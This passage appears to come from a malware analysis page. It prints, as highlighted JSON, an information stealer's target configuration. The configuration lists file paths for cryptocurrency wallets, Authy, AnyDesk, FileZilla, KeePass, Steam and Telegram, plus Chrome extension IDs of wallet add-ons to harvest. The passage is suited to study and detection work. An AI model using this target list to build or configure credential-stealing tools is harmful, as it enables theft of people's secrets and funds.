class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Exodus\\\\exodus.wallet&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Exodus&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Ledger Live&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Ledger Live&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\atomic\\\\Local Storage\\\\leveldb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Atomic&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%localappdata%\\\\Coinomi\\\\Coinomi\\\\wallets&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Coinomi&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Authy Desktop\\\\Local Storage\\\\leveldb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Authy Desktop&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Bitcoin\\\\wallets&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Bitcoin core&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\com.liberty.jaxx\\\\IndexedDB&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*.leveldb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/JAXX New Version&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Electrum\\\\wallets&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wallets/Electrum&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\AnyDesk&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*.conf&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Applications/AnyDesk&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\FileZilla&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;recentservers.xml&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Applications/FileZilla&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\FileZilla&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;sitemanager.xml&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Applications/FileZilla&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%userprofile%&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*.kbdx&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Applications/KeePass&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%programfiles%\\\\Steam&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ssfn*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Applications/Steam&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%programfiles%\\\\Steam\\\\config&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Applications/Steam/config&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">0</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;p&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;%appdata%\\\\Telegram Desktop&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;m&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;*s&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;z&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Applications/Telegram&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;d&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;t&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;e&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ejbalbakoplchlghecdalmeeeajnimhm&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;MetaMask&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;nkbihfbeogaeaoehlefnkodbefgpgknn&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;MetaMask&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;egjidjbpglichdcondbcbdnbeeppgdph&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Trust Wallet&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ibnejdfjmmkpcnlpebklmnkoeoihofec&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;TronLink&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;fnjhmkhhmkbjkkabndcnnogagogbneec&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Ronin Wallet&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;fhbohimaelbohpjbbldcngcnapndodjp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Binance Chain Wallet&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ffnbelfdoeiohenkjibnmadjiehjhajb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Yoroi&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;jbdaocneiiinmjbjlgalhcelgbejmnid&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Nifty&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;afbcbjpbpfadlkmhmclhkeeodmamcflc&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Math&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;hnfanknocfeofbddgcijnmhnfnkdnaad&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Coinbase&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;hpglfhgfnhbgpjdenjgmdgoeiappafln&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Guarda&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;blnieiiffboillknjnepogjhkgnoapac&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;EQUA&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cjelfplplebdjjenllpjcblmjkfcffne&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Jaxx Liberty&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;fihkakfobkmkjojpchpfgcmhfjnmnfpi&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;BitApp&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;kncchdigobghenbbaddojjnnaogfppfj&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;iWlt&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;kkpllkodjeloidieedojogacfhpaihoh&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;EnKrypt&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;amkmjjmmflddogmhpjloimipbofnfjih&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Wombat&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;nlbmnnijcnlegkjjpcfjclmcfggfefdm&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;MEW CX&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;nanjmdknhkinifnkgdcggcfnhdaammmj&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Guild&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;nkddgncdjgjfcddamfgcmfnlhccnimig&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Saturn&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cphhlgmgameodnhkjdmkpanlelnlohao&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;NeoLine&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;nhnkbkgjikgcigadomkphalanndcapjk&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Clover&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;kpfopkelmapcoipemfendmdcghnegimn&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Liquality&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;aiifbnbfobpmeekipheeijimdpnlpgpp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Terra Station&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;dmkamcknogkgcdfhhbddcghachkejeap&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Keplr&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;fhmfendgdocmcbmfikdcogofphimnkno&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Sollet&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cnmamaachppnkjgnildpdmkaakejnhae&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;ez&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Auro&quot;</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">                <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                    <span class=\"attr\">&quot;en&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;jojhfeoedkpkglbfimdfabpdfjaoolaf&quot;</span><span class=\"punctuation\">,</span></span><br><span 